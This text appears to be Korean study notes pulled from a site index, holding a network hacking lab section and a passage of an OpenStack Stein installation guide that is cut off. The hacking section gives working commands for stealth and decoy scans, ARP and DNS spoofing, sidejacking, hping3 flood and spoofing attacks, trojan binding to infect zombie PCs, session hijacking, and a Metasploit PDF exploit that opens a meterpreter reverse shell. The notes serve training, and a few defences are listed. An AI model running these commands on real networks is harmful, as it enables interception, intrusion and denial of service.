스캔을 이용한 정보수집\n 타깃이 서비스 중인 서비스를 파악하기 위해서 수행 ( ex:80번은 웹, 53번은 DNS, 23번은 텔넷, 22번은 ssh 등 ) 타깃이 특정 서비스를 실행중이라면 해당하는 서비스와 관련된 프로그램들의 취약점으로 공격 가능    TCP Open Scan   TCP 프로토콜의 3 Way-Handshake 과정에서 열려있는 포트에 TCP SYN 패킷을 보내면 SYN+ACK가 서버로부터 전달되고 닫혀있는 포트에 SYN 패킷을 보내면 RST+ACK가 서버로부터 전달된다. 이를 이용해서 확인하고 싶은 서비스의 포트로 SYN를 보내서 포트의 상태를 확인할 수 있다. Open Scan같은 경우 3 Way-Handshake 과정을 완전히 수행하기 때문에 타깃에게 해커의 정보가 남게된다. nmap -sT -p 1-100 [타깃IP]   TCP Half Scan   Half Scan같은 경우 3 Way-Handshake 과정을 완전히 수행하기않기 때문에 타깃에게 해커의 정보가 남지 않게 된다. nmap -sS -p 1-100 [타깃IP]   FIN Scan   열려있는 포트는 FIN 패킷을 받았을 때 아무 반응이 없고, 닫혀있는 포트는 RST+ACK로 응답한다. nmap -sF -p 1-100 [타깃IP]   X-mas Scan   어떤 플래그를 셋팅해서 스캔하는가? FIN+PSH+URG 포트가 열려있을 때는 어떻게 동작하는가? 아무런 반응 X 포트가 닫혀있을 때는 어떻게 동작하는가? RST+ACK로 응답 nmap -sX -p 1-100 [타깃IP]   NULL Scan   어떤 플래그를 셋팅해서 스캔하는가? 플래그 사용 X 포트가 열려있을 때는 어떻게 동작하는가? 아무런 반응 X 포트가 닫혀있을 때는 어떻게 동작하는가? RST+ACK로 응답 nmap -sN -p 1-100 [타깃IP]   UDP Scan   포트가 열려있을 때는 어떻게 동작하는가? 아무런 반응 X 포트가 닫혀있을 때는 어떻게 동작하는가? ICMP Port Unreachable 패킷으로 응답 nmap -sU -p 1-100 [타깃IP]   Decoy Scan   스캔을 할 때 설정한 임의의 IP를 출발지IP로 설정해서 실제 해커의 IP와 섞어서 보내는 공격 nmap -sX -p 1-100 -D [임의의IP1],[임의의IP2] [타깃IP]   IDLE Scan   가자 IP로 위장해서 스캔 공격 nmap -sI [도메인] -p 1-100 [타깃IP] nmap -sI www.naver.com -p 1-100 [타깃IP]  \r\r\r  취약점 확인 실습  \r스캔 실습\r...\r\r환경 준비\n  아무 OS( 타깃, nat, 네트워크 설정 ), Kali( 해커, nat )\n  kali, wireshark \u0026amp;\n  수동으로 스캔 telnet [타깃 IP] [포트]\n 접속되면 포트가 열림, 접속 안되면 포트가 닫힘    스캔 툴 nmap 이용 ( 위 참조 )\n    TCP Open Scan   Open Scan같은 경우 3 Way-Handshake 과정을 완전히 수행하기 때문에 타깃에게 해커의 정보가 남게된다.\n  nmap -sT -p 1-100 [타깃IP]\n    TCP Half Scan   Half Scan같은 경우 3 Way-Handshake 과정을 완전히 수행하기않기 때문에 타깃에게 해커의 정보가 남지 않게 된다.\n  nmap -sS -p 1-100 [타깃IP]\n    FIN Scan   열려있는 포트는 FIN 패킷을 받았을 때 아무 반응이 없고, 닫혀있는 포트는 RST+ACK로 응답한다.\n  nmap -sF -p 1-100 [타깃IP]\n    X-mas Scan   어떤 플래그를 셋팅해서 스캔하는가? FIN+PSH+URG\n  포트가 열려있을 때는 어떻게 동작하는가? 아무런 반응 X\n  포트가 닫혀있을 때는 어떻게 동작하는가? RST+ACK로 응답\n  nmap -sX -p 1-100 [타깃IP]\n    NULL Scan   어떤 플래그를 셋팅해서 스캔하는가? 플래그 사용 X\n  포트가 열려있을 때는 어떻게 동작하는가? 아무런 반응 X\n  포트가 닫혀있을 때는 어떻게 동작하는가? RST+ACK로 응답\n  nmap -sN -p 1-100 [타깃IP]\n    UDP Scan   포트가 열려있을 때는 어떻게 동작하는가? 아무런 반응 X\n  포트가 닫혀있을 때는 어떻게 동작하는가? ICMP Port Unreachable 패킷으로 응답\n  nmap -sU -p 1-100 [타깃IP]\n    Decoy Scan   스캔을 할 때 설정한 임의의 IP를 출발지IP로 설정해서 실제 해커의 IP와 섞어서 보내는 공격\n  nmap -sX -p 1-100 -D [임의의IP1],[임의의IP2] [타깃IP]\n    IDLE Scan   가자 IP로 위장해서 스캔 공격\n  nmap -sI [도메인] -p 1-100 [타깃IP]\n  nmap -sI www.naver.com -p 1-100 [타깃IP]\n  정적 라우팅을 통해 차단이 가능\n  \r\r\r  관리자 권한 획득    스니핑과 스푸핑    스니핑: sniff라는 영어단어에서 유례한 말로, 상대방의 네트워크 패킷을 훔쳐보는 공격\n  스푸핑: 뭔가를 조작해서 속이는 공격\n  피싱	: 남을 속여서 이득을 취하는 것, www.nevar.com\n  파밍	: 남을 속여서 이득을 취하는 것, www.naver.com\n  스미싱 : 문자로 낚는 것\n     ARP 스푸핑을 이용한 스니핑\n  ARP 프로토콜은 IP주소를 이용해서 MAC주소를 알아오는 프로토콜이다. ARP 요청 패킷을 브로드 캐스트로 보내고 상대방에게 ARP 응답 패킷을 받으면 해당 내용을 ARP 테이블에 등록\n  이 때 응답 패킷을 받는 시스템에서는 어떤한 확인 절차도 수행하지 않고 응답 패킷의 내용을 ARP 테이블에 등록\n  만약 해커가 ARP 응답 프로토콜을 출발지 IP주소는 GW의 주소로 설정하고 출발지 MAC주소는 해커의 주소로 변경해서 응답 패킷을 보내면 해당 패킷을 받는 시스템은 GW와 통신을 할 때 해커에게 모든 패킷을 전달\n  dsniff 도구\n 각종 스니핑 기법들을 위한 자동화 도구, 단순한 도구라기 보다는 스니핑을 했을 때 필요한 추가적인 툴도 함께 들어있음  filesnarf	: NFS를 이용해서 파일을 접근 또는 저장할 때 해당 파일을 해커의 디스크에 저장 urlsnarf	: HTTP의 모든 URL을 기록 mailsnarf	: SMTP, POP3 프로토콜로 통신하는 메일 송수신 내용을 기록 arpspoof	: ARP 스푸핑 공격 dnsspoof	: DNS 스푸핑 공격         ARP스푸핑  \rARP 스푸핑 실습\r...\r\r환경 준비\n  XP ( 타깃, NAT ), 칼리( 해커, NAT )\n  칼리 dsniff install\n  칼리 fragrouter install\n  공격\n    arpspoof -t [ 피해자 IP ] [ 피해자 GW의 IP ] 실행 (끄지 말 것)     fragrouter -B1 ( 종료 X )\n  GW를 고정하면 해결 가능\n  확인 : ARP -s [인터넷주소] [MAC 주소]\n  arp 스푸핑을 이용한 MITM 공격( Man in the Middle 공격, 중간자 공격 )을 통해 스니핑 가능\n  ifconfig [ eth0 ] promisc : 자기한테 오는 게 아니여도 버리지 않음\n  \r\r\r Telnet 스푸핑  \rTelnet 스푸핑\r...\r\rXP( 텔넷 클라이언트 )\nKail\nCentOS( 텔넷 서버 )\n yum install telnet-server systemctl restart telnet.socket netstat -anlp | grep :23  Telnet 스푸핑 프로세스   텔넷 클라이언트 cmd에서 telnet [ CentOS IP ]\n  arpspoof -t [ XP IP ] [ CentOS IP ]\n XP IP    arpspoof -t [ CentOS IP ] [ XP IP ]\n  fragrouter -B1\n  wireshark \u0026amp; ( 패킷 캡쳐시 promiscuous 모드 끄기 )\n  해결방법 : 방화벽, 공유기의 설정에서 ARP 보안 설정, ARP 테이블을 Static로 설정\n  \r\r\r   사이드 재킹  \r사이드 재킹\r...\r\rMITM 공격을 수행 중일 때 사용자의 인터넷 이용 기록(쿠키)을 기록하는 공격\nKail\n hamster 실행 ferret -i 1 실행 firefox   -\u0026gt; preferences -\u0026gt; Advanced -\u0026gt; network -\u0026gt; Settings -\u0026gt; Manual proxy configuration 체크, HTTP Proxy : localhost 포트 1234  ifconfig [ 네트워크 장치명 ] promisc	설정  ifconfig [네트워크 장치명] -promisc	해제    \r\r\r   ICMP Redirect 스니핑  \rICMP Redirect 스니핑\r...\r\rICMP의 Type 5번 패킷을 이용하여 타깃의 라우팅 테이블에 특정 라우팅 정보를 수정 또는 추가\n  hping3 -1 \u0026ndash;icmptype 5 \u0026ndash;icmpcode 1 -a [GW IP] \u0026ndash;icmp-ipdst [타깃→목적지IP] \u0026ndash;icmp-gw [해커IP] \u0026ndash;icmp-ipsrc [타깃 IP] [타깃 IP]\n  hping3 -1 \u0026ndash;icmptype 5 \u0026ndash;icmpcode 1 -a 192.168.240.2 \u0026ndash;icmp-ipdst 8.8.8.8 \u0026ndash;icmp-gw 192.168.240.200 \u0026ndash;icmp-ipsrc 192.168.240.10 192.168.240.10\n  XP : 192.168.240.10\n  칼리 : 192.168.240.200\n  GW : 192.168.240.2\n  \r\r\r   filesnarf  \rfilesnarf\r...\r\r**CentOS-1(파일 서버, NAT), CentOS-2(클라이언트, NAT), Kali(해커, NAT) ** nfs 공유 설정\n vi /etc/exports /test 192.168.240.*(rw,sync) systemctl restart nfs chmod 777 /[ 경로 ] mount -t nfs [서버IP]:[공유폴더] [마운트 포인트]  *nfs 버전이 높으면 안됨, centos7에서는 nfs버전이 기본으로 3이상이기 때문에 filesnarf가 파일을 저장하지 못한다.\n\r\r\r   urlsnarf  \rurlsnarf\r...\r\r 칼리에서 urlsnarf 실행 터미널 하나 더 띄워서 tcpkill -i eth0 -9 tcp 로 인터넷 안되게 하기  \r\r\r   DNS 스푸핑  \rDNS 스푸핑\r...\r\r  엉뚱한 웹 서버 만들기 Kali에서 /var/www/html에 있는 모든 파일을 지우고 index.html 파일 생성\n  DNS 스푸핑 Kali\n  dnsspoof 파일 생성\n  arp 스푸핑\n  dnsspoof -i eth0 -f /폴더 /dnsspoof //DNS 스푸핑 시작\n  cmd에서 www.naver.com 로 ping 테스트\n  밀린 세션 처리 : ipconfig /flushdns\n  그래도 안되면 해커가 응답을 주기 전에 8.8.8.8 dns 서버가 너무 빨리 응답을 주는 것 따라서 칼리에서 fragrouter -B1을 꺼주면 XP에서는 8.8.8.8과 통신이 안되기 때문에 dnsspoof 가능\n  \r\r\r   DoS\u0026amp; DDoS  \rDoS\u0026amp; DDoS\r...\r\rDoS ( Denial of Service ) : 서비스 거부 공격\nDDoS ( Distributed Denial of Service ) : 분산 서비스 거부 공격\nDoS\n **Ping Of Death **  ICMP 요청/응답 패킷을 이용, IP 헤더의 조각화를 이용해서 상대방에게 큰 데이터를 전송하는 ping 패킷을 여러 조각으로 나눠서 보내면 상대방은 해당 패킷을 다시 조립하는데 자원을 사용하게 된다. 이러한 패킷을 계속해서 보내면 패킷을 재조합하는데 시스템의 모든 자원을 사용하게 되고 시스템은 다운된다. hping3 \u0026ndash;icmp [타깃ip] -d 1000000 \u0026ndash;rand-source     Teardrop  패킷 조각화할 때 Fragment Offset 값을 중복 또는 공백이 생기도록 이상하게 만든다. 이런 이상한 패킷을 받은 상대방은 조각화된 패킷을 원래의 데이터로 조합을 할 때 에러를 발생시키게 되고 이러한 내용을 처리하기위해 시스템의 자원을 모두 사용해서 시스템이 다운된다. hping3 [xp IP] -a 1.1.1.1 \u0026ndash;id 3200 -M 34340 \u0026ndash;icmp \u0026ndash;flood -d 99999     Land Attack  패킷을 전달할 때 출발지 IP 주소를 타깃의 IP로 조작한 패킷을 타깃에게 전송 hping3 [타깃 IP] -a [타깃 IP] \u0026ndash;flood \u0026ndash;icmp     Smurf Attack  패킷을 전달할 때 출발지 IP를 타깃의 IP로 조작하고 브로드캐스트로 전송 hping3 [브로드캐스트] -a [타깃 IP] \u0026ndash;flood \u0026ndash;icmp     Syn Flooding  SYN 패킷을 무수히 많이 보내서 서버가 SYN_RECEIVED 상태로 ACK 패킷을 계속 기다리느라 모든 자원을 사용하게 하는 공격 hping3 [타깃 IP] -p 80 -S \u0026ndash;flood     UDP Flooding   무수히 많은 UDP 데이터 패킷을 보내서 상대방의 대역폭을 모두 잠식하는 공격\n  2 : UDP 사용\n  d : 데이터 크기\n  hping3 [타깃 IP] -2 \u0026ndash;flood \u0026ndash;rand-source -d 100 -p 80\n     DoS 방어법\n 방화벽 설정, Teardrop의 경우 조각화가 이상한 패킷은 그냥 Drop 시킨다. Land Attack의 경우 출발지 IP주소를 확인, 목적지 주소와 같거나 내부에 있는 IP가 들어오려는 경우 Drop 시킨다. Smurf Attack의 경우 브로드 캐스트 사용 X, IP와 MAC 주소를 매핑시켜서 등록된 MAC 주소만 사용되게 한다. Syn Flooding의 경우 time_out 시간을 짧게 설정해서 연결이 제대로 되지 않는 사용자는 바로바로 연결을 종료시킨다. UDP Flooding의 경우 사용하지 않는 포트나 UDP는 접근을 거부  DDoS\n  Mark5 - Service.exe -\u0026gt; 관리자 권한으로 실행 -\u0026gt; 추가 정보 -\u0026gt; 실행 -\u0026gt; 설치 -\u0026gt; 메시지 4개 success 확인\n  C:\\Windows\\SysWOW64 에 msconfupdate.dll 파일을 복사	재부팅\n  좀비PC 감염시키는 법 ( 트로이목마 )\n   http://hsol.tistory.com/attachment/cfile26.uf@255A093D5201A6FA08EA20.7z PowerMerger를 이용하는 방법 PowerMerger는 2개의 실행 파일을 하나의 실행파일로 합치는 프로그램이다. 합쳐진 실행파일을 실행시키면	%temp% 디렉토리에 원래의 실행파일들을 생성하고 두 개의 실행 파일 모두를 실행한다.  좀비PC 감염시키는 법 - 2 ( 드라이브 바이 다운로드 )   웹 브라우저의 취약점을 이용해서 특정 사이트를 접속하는 것만으로 악성코드가 다운로드되고 실행되서 감염까지되는 공격 https://www.exploit-db.com/	각종 취약점을 테스트할 수 있는 코드 및 해킹 관련된 정보를 공유하는 사이트  \r\r\r   프로토콜 이용한 해킹  \r프로토콜을 이용한 해킹\r...\r\r  세션 하이재킹 실습\n칼리(해커)	XP(서버, netcat) XP(클라이언트, netcat) cmd.exe nc.exe -lvp 1234\n cmd.exe\rnc.exe [서버 IP] 1234\r데이터 전송\r   hping3 ????????\nhping3 -a [서버 IP] [클라 IP] -s [S포트] -p [C포트] -M [마지막 통신 ACK번호] -R -A -c 1 = 끊낌\n세션 하이재킹 실습\n칼리(해커)	CentOS(서버, telnet-server)	XP(클라이언트, telnet) wget http://192.168.201.100:81/hunt-1.5bin.tgz tar zxvf hunt-1.5bin.tgz  ifconfig eth0 promisc\ncd hunt-1.5 ./hunt_static\nl	//목록 보기\n yum install telnet-server\rsystemctl restart telnet.socket\rcmd\rtelnet [서버 IP]\r l	//목록 보기 a	//공격 0	//타깃 지정 엔터X10 Ctrl + c 엔터X3\n최신 해킹 메타스플로잇 프레임워크\n Rapid 7에서 취약점에 대한 정리와 해당 취약점을 이용해서 공격 테스트를 할 수 있는 각종 도구들을 제공하는	오픈소스로써 보안 취약점 및 침투 테스트 등에 대한 정보를 제공하는 것이 목적   메타스플로잇 용어   exploit	: 시스템이나 어플리케이션, 서비스 등의 취약점을 이용하여 공격하는 공격 행위, 또는 명령어 Shell Code	: 공격이 수행될 때 페이로드로 사용되어지는 코드, 어셈블리어(기계어)로 만들어진다. Payload	: 타깃 PC에게 전달하는 정보, 쉘 코드나 다른 추가적인 정보를 담고 있다. Module	: 메타스플로잇에서 사용되는 작은 프로그램들, 특정 기능들 ex) reverse_shell Listener	: 메타스플로잇에서 사용되는 공격 중 원격 연결을 수행할 때 서버의 역할을 하는 시스템   메타스플로잇을 이용하는 방법\n 명령어를 이용하는 방법 msfconsole을 이용해서 대화식으로 이용하는 방법 ( msfconsole 명령어 실행 ) https://www.rapid7.com/db 에서 취약점 검색 정리 문서 보고 공격 PDF 문서 기반 공격 ( 공격 대상 : Window XP SP3, Adobe Reader 9.3.0 )    msfconsole\n  use exploit/windows/fileformat/adobe_libtiff\n  set payload windows/meterpreter/reverse_tcp\n  set LHOST [칼리IP]\n  show options\n  exploit\n  use exploit/multi/handler\n  set LHOST [칼리IP]\n  exploit\n  XP에서 PDF 실행\n  meterpreter 프롬프트가 되면\n  screenshot\n  shell\n  원격 조종 모듈  set payload windows/vncinject/reverse_tcp set VNCPORT 5500 set ViewOnly false exploit    SSL Strip SSL Strip\n  전송(4)계층 보안 프로토콜, TLS(과거 명칭, Transprot Layer Security) HTTP 통신을 암호화하는데 사용\n  MITM 공격을 수행하고 있을 때 해커와 타깃은 HTTP로 통신하고 정상적인 웹 서버와 해커는 HTTPS로 통신해서	웹 서버는 비정상적인 패킷이라 판단 못하고 접속을 허용하게 되고 타깃은 비정상적인 통신을 수행한다.\n    \u0026lt;/div\u0026gt;\r   \r\r\r "}),a.add({id:219,href:'/docs/openstack/openstacktraining/openstack-stein/',title:"Openstack Stain Manual 설치",content:"Openstack Stain Manual 설치    1. 시스템 및 네트워크 구성   여기서는 Nat 네트워크를 외부, host1 대역을 내부로 사용하여 Openstack을 구축해보도록 하겠습니다.    운영체제 및 네트워크 구성  Hypervisor : Vmware Workstation 15 OS : CentOS7      노드 구성     OS Hostname Network Interface Network Interface2 CPU RAM DISK     CentOS7 controller Nat ( 192.168.10.100 ) HOST1 ( 10.10.10.10 ) 2cpu 4thread 8 RAm 30G   CentOS7 natwork Nat ( 192.168.10.101 ) HOST1 ( 10.10.10.20 ) 1cpu 2thread 2 RAm 20G   CentOS7 compute Nat ( 192.168.10.102 ) HOST1 ( 10.10.10.30 ) 1cpu 4thread 4 RAm 100G      기본적인 업데이트 및 설정을 모든 노드에 진행합니다.  $ yum -y update # 업데이트 $ vi /etc/hosts 10.10.10.10 controller 10.10.10.20 network 10.10.10.30 compute # known host 등록   설정이 완료되면 기본 구성을 모든 노드에 진행합니다.  $ yum -y install chrony # 시간 동기화를 위한 chrony 설치 $ vi /etc/chrony.conf #server 0.centos.pool.ntp.org iburst #server 1.centos.pool.ntp.org iburst #server 2.centos.pool.ntp.org iburst #server 3.centos.pool.ntp.org iburst server ntp1.jst.mfeed.ad.jp iburst server ntp2.jst.mfeed.ad.jp iburst server ntp3.jst.mfeed.ad.jp iburst allow 10.10.10.0/24 # 시간동기화 $ firewall-cmd --add-service=ntp --permanent $ firewall-cmd --reload # ntp 방화벽 허용 및 리로딩 $ init 6 # 시스템 재시작 $ chronyc sources # 확인    2. Openstack 기본 패키지 구성   Openstack의 기본 패키지 구성은 먼저 contorller 노드만을 통해 진행됨을 유의해주시길 바랍니다. controller 노드에는 다음의 패키지가 설치됩니다.  MariaDB: OpenStack 서비스 및 VM 관련 설정들을 보관하기 위해 사용 RabbitMQ: OpenStack 서비스 간 상호 메시지를 주고 받기 위하나 메시지 큐로 사용 Memcached: 범용 분산 메모리 캐시 시스템으로, 자주 외부 데이터에 접근해야 하는 경우에 발생하는 오버헤드를 줄이기 위해 메모리르르 캐싱하고 읽어들이는 역할을 담당, OpenStack 서비스에서는 주로 인증 메커니즘에서 토큰 캐싱을 위해 사용됩니다.      Openstack 패키지 설치 및 레포지토리 구성  $ yum -y install centos-release-openstack-stein $ sed -i -e \u0026#34;s/enabled=1/enabled=0/g\u0026#34; /etc/yum.repos.d/CentOS-OpenStack-stein.repo # stein 패캐지를 등록합니다.   MariaDB를 설치합니다.  $ yum --enablerepo=centos-openstack-stein -y install mariadb-server $ vi /etc/my.cnf [mysqld] character-set-server=utf8 # charset을 utf-8으로 변경합니다 $ systemctl start mariadb $ systemctl enable mariadb # mariadb을 시작 및 자동시작을 등록합니다. $ mysql_secure_installation # 패스워드 설정을 진행합니다. $ firewall-cmd --add-service=mysql --permanent $ firewall-cmd --reload   RabbitMQ 및 Memcached를 설치합니다.  $ yum --enablerepo=centos-openstack-stein -y install rabbitmq-server $ yum --enablerepo=centos-openstack-stein -y install memcached $ vi /etc/my.cnf.d/mariadb-server.cnf [mysqld] ... character-set-server=utf8 max_connections=500 # Mariadb의 위에 내용을 추가합니다. $ vi /etc/sysconfig/memcached OPTIONS=\u0026#34;-l 0.0.0.0,::\u0026#34; # mamcached를 모든 리스닝 상태로 전환시킵니다. $ systemctl restart mariadb rabbitmq-server memcached $ systemctl enable mariadb rabbitmq-server memcached # Mariadb와 함께 RabbitMQ 및 Memcached를 시작 및 자동시작을 등록합니다. $ rabbitmqctl add_user [ id ] [ pw ] # rabbitmq 유저를 생성합니다. 여기서는 openstack/qwer1234를 사용하도록 하겠습니다. $ rabbitmqctl set_permissions [ id ] \u0026#34;.*\u0026#34; \u0026#34;.*\u0026#34; \u0026#34;.*\u0026#34; # 생성한 사용자에게 모든 권한을 부여합니다. $ firewall-cmd --add-port={11211/tcp,5672/tcp} --permanent $ firewall-cmd --reload    3. Keystone ( 인증 서비스 ) 구성   Keystone 또한 controller의 설치를 진행합니다. keystone에 대한 설명은 keystone을 참조해주세요.    keyston DB 생성  $ mysql -u root -p MariaDB [(none)]\u0026gt; create database keystone; MariaDB [(none)]\u0026gt; grant all privileges on keystone.* to keystone@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; grant all privileges on keystone.* to keystone@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; flush privileges; # keystone 구성을 위한 db를 생성합니다. ( 저는 편의를 위해 모든 pw로 qwer1234 설정하였습니다. )   keystone 패키지 설치 및 수정  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-keystone openstack-utils python-openstackclient httpd mod_wsgi # keystone 및 관련 패키지를 설치합니다. $ vi /etc/keystone/keystone.conf [cache] ... memcache_servers = controller:11211 [database] ... connection = mysql+pymysql://keystone:qwer1234@controller/keystone [token] ... provider = fernet # keystone 구성을 위해 설정파일 수정합니다. # hosts에 등록한 IP 혹은 controller의 IP를 기입하셔도 무관합니다. $ su -s /bin/bash keystone -c \u0026#34;keystone-manage db_sync\u0026#34; # 설정 값을 토대로 db의 설정을 저정합니다. $ keystone-manage fernet_setup --keystone-user keystone --keystone-group keystone $ keystone-manage credential_setup --keystone-user keystone --keystone-group keystone # 토큰 및 자격 증명 암호화를 위해 사용되는 키 저장소를 생성합니다. $ export controller=10.10.10.10 $ keystone-manage bootstrap --bootstrap-password qwer1234 \\ --bootstrap-admin-url http://$controller:5000/v3/ \\ --bootstrap-internal-url http://$controller:5000/v3/ \\ --bootstrap-public-url http://$controller:5000/v3/ \\ --bootstrap-region-id RegionOne # controlelr의 IP로 keystone을 부트스트랩합니다. $ setsebool -P httpd_use_openstack on $ setsebool -P httpd_can_network_connect on $ setsebool -P httpd_can_network_connect_db on $ firewall-cmd --add-port=5000/tcp --permanent $ firewall-cmd --reload # Selinux와 방화벽으르 설정합니다. $ ln -s /usr/share/keystone/wsgi-keystone.conf /etc/httpd/conf.d/ $ systemctl start httpd $ systemctl enable httpd # keystone 설정 활성화 및 httpd 를 시작합니다.   정상 동작 확인을 위한 토큰 파일 생성  $ vi ~/admin export OS_PROJECT_DOMAIN_NAME=default export OS_USER_DOMAIN_NAME=default export OS_PROJECT_NAME=admin export OS_USERNAME=admin export OS_PASSWORD=qwer1234 export OS_AUTH_URL=http://controller:5000/v3 export OS_IDENTITY_API_VERSION=3 export OS_IMAGE_API_VERSION=2 $ chmod 600 ~/admin $ source ~/admin   project 생성  $ cd ~ $ . admin $ openstack project create --domain default --description \u0026#34;Service Project\u0026#34; service +-------------+----------------------------------+ | Field | Value | +-------------+----------------------------------+ | description | Service Project | | domain_id | default | | enabled | True | | id | 3f0b3ef5b8c94a0a9cca8e34ea2fdbd6 | | is_domain | False | | name | service | | parent_id | default | | tags | [] | +-------------+----------------------------------+ # project 생성 $ openstack project list +----------------------------------+---------+ | ID | Name | +----------------------------------+---------+ | 3f0b3ef5b8c94a0a9cca8e34ea2fdbd6 | service | | ec1a4336cfa64d04bbc8f908b26a6cda | admin | +----------------------------------+---------+   이것으로 keystone에 대한 설치가 끝났습니다. 혹시 오류가 발생할 경우 /var/log/keystone/ 혹은 /var/log/httpd/에서 error 로그, keystone 로그를 검색하여 오류를 찾아내시면 보다 쉽게 문제를 해결하실 수 있습니다.     4. Glance ( 이미지 서비스 ) 구성   Glance 또한 controller에서만 설치를 진행합니다. 에 대한 설명은 Glance을 참조해주세요.    glance 사용자 추가  $ source ~/admin # 전에 생성했던 토큰 값을 적용합니다. $ openstack user create --domain default --project service --password qwer1234 glance # glance 게정을 추가합니다. $ openstack role add --project service --user glance admin # glance에 admin의 권한을 부여합니다. $ openstack service create --name glance --description \u0026#34;OpenStack Image service\u0026#34; image # glance 서비스 엔트리를 생성합니다. $ export controller=10.10.10.10 $ openstack endpoint create --region RegionOne image public http://$controller:9292 $ openstack endpoint create --region RegionOne image internal http://$controller:9292 $ openstack endpoint create --region RegionOne image admin http://$controller:9292 # glance 서비스의 endpoint를 추가합니다 ( public, internal, admin ) $ openstack user list +----------------------------------+--------+ | ID | Name | +----------------------------------+--------+ | bd36365f2459468a9c480cb48bab3ac0 | glance | | e19db9d5ec2c4c30b7a85d18b8b0e589 | admin | +----------------------------------+--------+ $ openstack endpoint list +----------------------------------+-----------+--------------+--------------+---------+-----------+-----------------------------+ | ID | Region | Service Name | Service Type | Enabled | Interface | URL | +----------------------------------+-----------+--------------+--------------+---------+-----------+-----------------------------+ | 00b38774cef048ee9950eda6938accc3 | RegionOne | keystone | identity | True | public | http://10.10.10.10:5000/v3/ | | 4591b06391374fe888380fa23b8f5121 | RegionOne | glance | image | True | admin | http://10.10.10.10:9292 | | 53dd31fecf2d44949c141149a13c673b | RegionOne | keystone | identity | True | admin | http://10.10.10.10:5000/v3/ | | 555f3d900f7e416bb783120f7ce74fe8 | RegionOne | glance | image | True | internal | http://10.10.10.10:9292 | | 5b3ac620bb7d4d9aabdf0f33229ee346 | RegionOne | glance | image | True | public | http://10.10.10.10:9292 | | bdd7df7c8cba46f6ada2c12155a9f1d6 | RegionOne | keystone | identity | True | internal | http://10.10.10.10:5000/v3/ | +----------------------------------+-----------+--------------+--------------+---------+-----------+-----------------------------+  Glance DB 생성  $ mysql -u root -p MariaDB [(none)]\u0026gt; create database glance; MariaDB [(none)]\u0026gt; grant all privileges on glance.* to glance@\u0026#39;localhost\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; grant all privileges on glance.* to glance@\u0026#39;%\u0026#39; identified by \u0026#39;pw\u0026#39;; MariaDB [(none)]\u0026gt; flush privileges; # 구성을 위한 db를 생성합니다. ( 저는 편의를 위해 모든 pw로 qwer1234 설정하였습니다. )   glance 패키지 설치 및 수정  $ yum --enablerepo=centos-openstack-stein,epel -y install openstack-glance # glance 패키지를 설치합니다. $ vi /etc/glance/glance-api.conf [DEFAULT] bind_host = 0.0.0.0 [glance_store] stores = file,http default_store = file filesystem_store_datadir = /var/lib/glance/images/ # 이미지 경로 지정 [database] # database 연동 connection = mysql+pymysql://glance:qwer1234@controller/glance [keystone_authtoken] # keystone 인증 www_authenticate_uri = http://controller:5000 auth_url = http://controller:5000 memcached_servers = controller:11211 auth_type = password project_domain_name = default user_domain_name = default project_name = service username = glance password = qwer1234 [paste_deploy] flavor = keystone # glance.conf를 수정합니다. $ su -s /bin/bash glance -c \u0026#34;glance-manage db_sync\u0026#34; # glance db를 동기화 시킵니다. $ systemctl start openstack-glance-api $ systemctl enable openstack-glance-api # glance를 시작 및 실행시 자동시작을 등록합니다. $ setsebool -P glance_api_can_network on $ firewall-cmd --add-port=9292/tcp --permanent $ firewall-cmd --reload # Selinux 및 firewall을 설정합니다.   확인을 위한 이미지 생성  $ wget http://download.cirros-cloud.net/0.5.1/cirros-0.5.1-x86_64-disk.img # 확인을 위해 cirros 이미지를 다운 받습니다. $ openstack image create \u0026#34;Cirros\u0026#34; --file cirros-0.5.1-x86_64-disk.img --disk-format qcow2 # image 등록 $ openstack image list +--------------------------------------+--------+--------+ | ID | Name | Status | +--------------------------------------+--------+--------+ | 38e15009-022b-49ce-bcdf-b220eb3c5b12 | Cirros | active | +--------------------------------------+--------+--------+ # 확인    5. Nova ( 컴퓨트 서비스 ) 구성   Nova 서비스는 controller 노드와 compute노드에 구성됩니다. 설치는 contoller \u0026gt; compute 순으로 진행하도록 하겠습니다. Nova에 대한 설명은 Nova을 참조해주세요.    Nova, Placement 추가 및 등록  $ source ~/admin $ openstack user create --domain default --project service --password qwer1234 nova $ openstack role add --project service --user nova admin $ openstack user create --domain default --project service --password qwer1234 placement $ openstack role add --project service --user placement admin # nova 유저와 placement유저를 생성합니다. $ openstack service create --name nova --description \u0026#34;OpenStack Compute Service\u0026#34; compute # nova 서버 엔트리 저장 $ openstack service create --name placement --description \u0026#34;OpenStack Compute Placement Service\u0026#34; placement # placement 서버 엔트리 저장 $ openstack user list # 확인 +----------------------------------+-----------+ | ID | Name | +----------------------------------+-----------+ | 18bdf3e68a754aa182f93196a918ba65 | nova | | 18ff8b52493a408d9933596ed20cca9c | glance | | bfd0cf6d358e49bf88f183a463c689a2 | placement | | e19db9d5ec2c4c30b7a85d18b8b0e589 | admin | +----------------------------------+-----------+ $ export controller=10.10.10.10 $ openstack endpoint create --region RegionOne compute public http://$controller:8774/v2.1/%\\(tenant_id\\)s $ openstack endpoint create --region RegionOne compute internal http://$controller:8774/v2.1/%\\(tenant_id\\)s $ openstack endpoint create --region RegionOne compute admin http://$controller:8774/v2.1/%\\(tenant_id\\)s # nova 서비스의 endpoint를 추가합니다 $ openstack endpoint create --region RegionOne placement public http://$controller:8778 $ openstack endpoint create --region RegionOne placement internal http://$controller:8778 $ openstack endpoint create --region RegionOne placement admin http://$controller:8778 $ placement의 endpoint를 추가합니다. $ openstack endpoint list # 확인 -------+-----------+--------------------------------------------+ | ID | Region | Service Name | Service Type | Enabled | Interface | URL | +----------------------------------+-----------+--------------+--------------+---------+-----------+--------------------------------------------+ | 00b38774cef048ee9950eda6938accc3 | RegionOne | keystone | identity | True | public | http://10.10.10.10:5000/v3/ | | 04ca5fb6701348089777d68a68ca7cd2 | RegionOne | placement | placement | True | public | http://10.10.10.10:8778 | | 53ad55ce8897463b86ea616a8ba64d95 | RegionOne | glance | image | True | public | http://10.10.10.10:9292 | | 53dd31fecf2d44949c141149a13c673b | RegionOne | keystone | identity | True | admin | http://10.10.10.10:5000/v3/ | | 595a2045543b42c2bb6f23e2dd30a3bb | RegionOne | glance | image | True | internal | http://10.10.10.10:9292 | | 